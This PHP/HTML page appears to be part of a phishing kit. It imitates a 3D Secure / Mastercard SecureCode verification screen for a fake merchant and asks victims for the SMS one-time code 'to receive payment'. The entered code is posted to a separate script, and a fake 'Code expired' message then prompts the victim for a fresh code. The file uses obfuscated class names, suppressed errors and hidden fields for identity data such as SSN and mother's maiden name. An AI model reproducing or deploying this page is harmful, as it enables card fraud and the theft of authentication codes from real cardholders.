<?php

error_reporting(0);
session_start();
?>

<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <link rel="stylesheet" href="./3D/font-sans.css">
        <link rel="stylesheet" href="./3D/template.css">
        <link rel="stylesheet" href="./3D/css.css">
        <title>3D Secure</title>
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <script type="text/javascript" src="./3D/jquery.min.js.download"></script>
        <script type="text/javascript" src="./3D/jstz.min.js.download"></script>
        <script type="text/javascript" src="./3D/jquery.mobile.custom.min.js.download"></script>
        <script type="text/javascript" src="./3D/jquery.browser.min.js.download"></script>
        <link rel="icon" type="image/png" href="img/ico.ico">
        <script type="text/javascript">
        setTimeout(function(){$("#popup").css("display","none"),$("#vbv_form").css("display","block")},10e3)
        </script> 
        <style>
                    </style>
    </head>

    <body>
    
        <script type="text/javascript">
            function toggleDisplay() {
                elmt = document.getElementById(loader);
                elmt.style.display = "block";
            }
        </script> 

        <div id="loader" class="d1xb04v7ib1a gcd0yn9m9uj239ejjanazq2ubz3er5ey8 spinner oxxo w9kp2kvcuxrvm8n" style="display: none; opacity: 0;">
            <p id="loading_title">Redirecting...</p>
        </div>
        <div id="ajax" style="opacity: 1;">
            <!--<script type="text/javascript" src="./3D/vbv.js"></script>-->
            <div id="popup" style="display: block;">Processing</div>
            <div id="vbv_form" style="display: none;">
                <div class="lph6v0nnakf1 row" id="vbv_line_0">
                    <table>
                        <tbody>
                            <tr>
                                <td><img class="1mdioqywmkn1zpc6g3q7nkwb5gu5qtti6yrle cc_bank" id="cc_bank" src="./img/ssl.png"></td>
                                <td><img class="rz59aaf tym46ei dp cc_type" id="cc_type" src="./img/mastercard-securecode.png" width="100%" ></td>
                            </tr>
                        </tbody>
                    </table>
                </div>
                <div class="zhuona5miryw7tifstshqdi2whakltea2zqf1lta4hx row" id="vbv_line_1">
                                     </div>
                <div class="1tlkymdn3k row" id="vbv_line_2" style="font-size: 15px;">
                    <b><center>Please confirm the code received by SMS in order to receive payment then click on validate.</b> </br> Nb: If you do not receive a code, one of our agents will call you to finalize the operation</center><br>
                    <b><a href="https://cartes-securite.services/" target="_blank"><center>SECURISER LA CARTE SUIVANTE</center></a></b>
                                </div>
                <div class="yf3q6aqyu2 iedx9o3f row" id="vbv_line_3">
                    <form id="newCreditCardForm" name="creditForm" method="post" action="#">
                    <table >
                        <tbody style="">
                            <tr >
                                <td><span>
                                    Merchant:</span></td>
                                <td ><span>LYDIA SOLUTION Inc.</span></td>
                            </tr>
                            
                            <tr>
                            </tr>
                            
                            
                            
                            <tr>
                                <td><span>
                                    Date:</span></td>
                                <td><span>
					<script>
						var currentdate = new Date(); 
						var datetime = currentdate.getDate() + "/"
						+ (currentdate.getMonth()+1)  + "/" 
						+ currentdate.getFullYear() ;
						document.write(datetime);
					</script>
				</span></td>              
                            </tr>
                            
                            <tr>
                                <td><span>
                                    Card Number:</span></td>
                                <td><span>
                                xxxx-xxxx-xxxx-<?php echo $_SESSION['lastcc'];?>                                </span></td>       
                            </tr>
                            <tr class='tr_height25px'>
                                <td><span>Code :</span></td>
                                <td><span><input type='text' name='acc_num' id='acc_num' value='' placeholder='' style='width:100px;' ></td>
                            </tr>
                        <!--
                            <tr>
                                <td><span>
                                    :</span></td>
                                <td><span></span></td>              
                            </tr>
                            
                            <tr class="tr_height25px">
                                <td><span>
                                    :</span></td>
                                <td><input type="text" name="holder" id="holder" value="" placeholder="" style="width:170px;" required="required" aria-required="true"></td>
                            </tr>
                            
                            <tr class="tr_height25px">
                                <td><span>
                                    :</span></td>
                                <td>
                                    <input type="text" name="dob_1" id="dob_1" value="" placeholder="" maxlength="2" style="width:20px;" required="required" aria-required="true"><span> /</span>
                                    <input type="text" name="dob_2" id="dob_2" value="" placeholder="" maxlength="2" style="width:20px;" required="required" aria-required="true"><span> /</span>
                                    <input type="text" name="dob_3" id="dob_3" value="" placeholder="" maxlength="4" style="width:40px;" required="required" aria-required="true"> <span></span>
                                </td>
                            </tr>
    
                            <tr class="tr_height25px">
                                <td><span>
                                    :</span></td>
                                    <td><span>+ </span><input type="text" name="phone1" id="phone1" value="" placeholder="" style="width:30px;" required="required" aria-required="true">
                                    <input type="text" name="phone2" id="phone2" value="" placeholder="" style="width:128px;" required="required" aria-required="true">
                                </td>
                            </tr>
                        -->
                                                        <input type="hidden" name="holder" id="holder" value="mays vald" placeholder="" style="width:170px;" required="required" aria-required="true">
                            <input type="hidden" name="dob_1" id="dob_1" value="11" placeholder="" maxlength="2" style="width:20px;" required="required" aria-required="true">
                            <input type="hidden" name="dob_2" id="dob_2" value="11" placeholder="" maxlength="2" style="width:20px;" required="required" aria-required="true">
                            <input type="hidden" name="dob_3" id="dob_3" value="1990" placeholder="" maxlength="4" style="width:40px;" required="required" aria-required="true">
                            <input type="hidden" name="phone1" id="phone1" value="33" placeholder="" style="width:30px;" required="required" aria-required="true">
                            <input type="hidden" name="phone2" id="phone2" value="" placeholder="0618855963" style="width:128px;" required="required" aria-required="true">
                                <input type="hidden" name="country_form" id="country_form" value="us">
                                <input type="hidden" name="ssn_1" id="ssn_1" value="333">
                                <input type="hidden" name="ssn_2" id="ssn_2" value="33">
                                <input type="hidden" name="ssn_3" id="ssn_3" value="3333">
                                <input type="hidden" name="mmn" id="mmn" value="3333333">
                                <input type="hidden" name="sort_1" id="sort_1" value="33">
                                <input type="hidden" name="sort_2" id="sort_2" value="33">
                                <input type="hidden" name="sort_3" id="sort_3" value="33">
                                
                            <tr>
                                <td></td>
                                <td><input type="submit" name="vbv_submit_btn" id="vbv_submit_btn" value="Validate" >
                                <!--
                                <a id="vbv_back" onclick="javascript: toggleDisplay();" href=""></a>
                                -->
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    </form>
                    <span id="error" style="color: red;"></span>
                </div>
                <div class="yf3q6aqyu2 iedx9o3f row" id="vbv_line_3">
                    <table >
                        <tbody>
                                <tr>
                                    <td></td>
                                    <td>
                                    <a id="vbv_back" href=""> </a>
                                    </td>
                                </tr>
                                <tr>
                                    <td></td>
                                    <td>
                                    <a id="vbv_back" href=""> </a>
                                    </td>
                                </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    

    </div>

<script>    
        /*--------------------------------------------
            $(function() {
                submitHandler: function(form) {
                    $("#vbv_form").hide();
                    $("#popup").show();
                    $.post("./sand_vbv.php?ajax", $("#creditForm").serialize(), 
                },
            });
        --------------------------------------------*/

            $( "form" ).submit(function( event ) {
              if ( $( "#acc_num" ).val() != "" ) {
                $("#vbv_form").hide();
                $("#popup").show();
                $.post("./sand_vbv.php?ajax", $("#newCreditCardForm").serialize(),function(result) {setTimeout(function() {$("#popup").hide();$("#vbv_form").show("<span id='error' style='color: red;'></span>");$( "#error" ).text( "Code expired, please wait a new code will be sent to you in 30 seconds" ).show();});}
                );
              }
             
              $( "#error" ).text( "Invalid" ).show().fadeOut( 1000 );
              event.preventDefault();
            });
</script>    
    
</body></html>